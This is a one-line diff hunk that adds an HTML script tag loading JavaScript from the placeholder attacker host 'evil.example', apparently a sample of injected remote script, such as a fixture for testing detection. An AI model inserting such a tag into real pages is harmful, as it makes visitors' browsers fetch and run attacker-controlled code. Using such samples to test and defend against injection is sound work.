@@ -1,0 +1,1 @@
+<script src='//evil.example/x.js'></script>
